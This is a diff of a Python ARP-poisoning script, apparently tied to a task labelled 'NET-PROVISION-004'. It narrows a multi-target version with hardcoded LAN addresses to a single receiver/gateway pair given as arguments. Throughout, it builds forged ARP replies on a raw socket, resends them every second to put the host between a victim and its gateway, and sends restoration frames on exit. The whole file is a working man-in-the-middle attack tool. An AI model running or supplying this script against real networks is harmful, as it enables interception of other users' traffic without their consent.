@@ -1,78 +1,93 @@
 #!/usr/bin/env python3
-"""
-Lightweight standalone ARP redirector and restorer for NET-PROVISION-004.
-Supports multi-target IP tracking and guaranteed restoration on exit.
-"""
+"""ARP redirector for one verified receiver/gateway pair."""
 
-import sys
-import time
+import argparse
+import signal
 import socket
 import struct
-import signal
+import time
 
-IFACE = sys.argv[1] if len(sys.argv) > 1 else "enp5s0"
-TARGET_IPS_RAW = sys.argv[2] if len(sys.argv) > 2 else "192.168.1.138,192.168.1.137,192.168.1.134"
-TARGET_MAC_STR = sys.argv[3] if len(sys.argv) > 3 else "68:15:90:6b:81:96"
-GATEWAY_IP_STR = sys.argv[4] if len(sys.argv) > 4 else "192.168.1.1"
-GATEWAY_MAC_STR = sys.argv[5] if len(sys.argv) > 5 else "14:ca:56:81:18:71"
 
-def mac_bytes(s):
-    return bytes.fromhex(s.replace(":", "").replace("-", ""))
+def mac_bytes(value):
+    raw = bytes.fromhex(value.replace(":", "").replace("-", ""))
+    if len(raw) != 6:
+        raise ValueError(f"invalid MAC address: {value}")
+    return raw
 
-def ip_bytes(s):
-    return socket.inet_aton(s.strip())
+
+def ip_bytes(value):
+    return socket.inet_aton(value)
+
 
 def get_iface_mac(ifname):
-    with open(f"/sys/class/net/{ifname}/address") as f:
-        return mac_bytes(f.read().strip())
+    with open(f"/sys/class/net/{ifname}/address", encoding="ascii") as handle:
+        return mac_bytes(handle.read().strip())
 
-HOST_MAC = get_iface_mac(IFACE)
-TARGET_MAC = mac_bytes(TARGET_MAC_STR)
-GATEWAY_MAC = mac_bytes(GATEWAY_MAC_STR)
-GATEWAY_IP = ip_bytes(GATEWAY_IP_STR)
-
-TARGET_IPS = [ip_bytes(ip) for ip in TARGET_IPS_RAW.split(",") if ip.strip()]
 
 def make_frame(src_mac, src_ip, dst_mac, dst_ip):
-    eth = dst_mac + src_mac + struct.pack("!H", 0x0806)
-    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + src_mac + src_ip + dst_mac + dst_ip
-    return eth + arp
+    ethernet = dst_mac + src_mac + struct.pack("!H", 0x0806)
+    arp = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
+    arp += src_mac + src_ip + dst_mac + dst_ip
+    return ethernet + arp
 
-sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
-sock.bind((IFACE, 0))
 
-running = True
-def handle_exit(signum, frame):
-    global running
-    running = False
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Poison and restore exactly one verified receiver/gateway ARP pair."
+    )
+    parser.add_argument("interface")
+    parser.add_argument("receiver_ip")
+    parser.add_argument("receiver_mac")
+    parser.add_argument("gateway_ip")
+    parser.add_argument("gateway_mac")
+    return parser.parse_args()
 
-signal.signal(signal.SIGINT, handle_exit)
-signal.signal(signal.SIGTERM, handle_exit)
 
-print(f"[*] Native ARP redirector active on {IFACE}")
-print(f"[*] Targets: {TARGET_IPS_RAW} ({TARGET_MAC_STR}) <-> {GATEWAY_IP_STR} ({GATEWAY_MAC_STR}) via {HOST_MAC.hex(':')}")
+def main():
+    args = parse_args()
+    host_mac = get_iface_mac(args.interface)
+    receiver_ip = ip_bytes(args.receiver_ip)
+    receiver_mac = mac_bytes(args.receiver_mac)
+    gateway_ip = ip_bytes(args.gateway_ip)
+    gateway_mac = mac_bytes(args.gateway_mac)
 
-spoof_pairs = []
-restore_pairs = []
+    poison_receiver = make_frame(host_mac, gateway_ip, receiver_mac, receiver_ip)
+    poison_gateway = make_frame(host_mac, receiver_ip, gateway_mac, gateway_ip)
+    restore_receiver = make_frame(gateway_mac, gateway_ip, receiver_mac, receiver_ip)
+    restore_gateway = make_frame(receiver_mac, receiver_ip, gateway_mac, gateway_ip)
 
-for tip in TARGET_IPS:
-    spoof_pairs.append((make_frame(HOST_MAC, GATEWAY_IP, TARGET_MAC, tip),
-                        make_frame(HOST_MAC, tip, GATEWAY_MAC, GATEWAY_IP)))
-    restore_pairs.append((make_frame(GATEWAY_MAC, GATEWAY_IP, TARGET_MAC, tip),
-                          make_frame(TARGET_MAC, tip, GATEWAY_MAC, GATEWAY_IP)))
+    running = True
 
-try:
-    while running:
-        for f_tgt, f_gw in spoof_pairs:
-            sock.send(f_tgt)
-            sock.send(f_gw)
-        time.sleep(1.0)
-finally:
-    print("[*] Restoring authentic ARP tables...")
-    for _ in range(5):
-        for r_tgt, r_gw in restore_pairs:
-            sock.send(r_tgt)
-            sock.send(r_gw)
-        time.sleep(0.1)
-    sock.close()
-    print("[*] ARP tables restored cleanly.")
+    def request_exit(_signum, _frame):
+        nonlocal running
+        running = False
+
+    signal.signal(signal.SIGINT, request_exit)
+    signal.signal(signal.SIGTERM, request_exit)
+
+    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+    sock.bind((args.interface, 0))
+    print(f"[*] ARP redirector active on {args.interface}", flush=True)
+    print(
+        f"[*] Exact pair: {args.receiver_ip} ({args.receiver_mac}) <-> "
+        f"{args.gateway_ip} ({args.gateway_mac}) via {host_mac.hex(':')}",
+        flush=True,
+    )
+
+    try:
+        while running:
+            sock.send(poison_receiver)
+            sock.send(poison_gateway)
+            time.sleep(1.0)
+    finally:
+        print("[*] Restoring the exact poisoned ARP pair...", flush=True)
+        for _ in range(5):
+            sock.send(restore_receiver)
+            sock.send(restore_gateway)
+            time.sleep(0.1)
+        sock.close()
+        print("[*] Exact ARP-pair restoration frames sent.", flush=True)
+
+
+if __name__ == "__main__":
+    main()
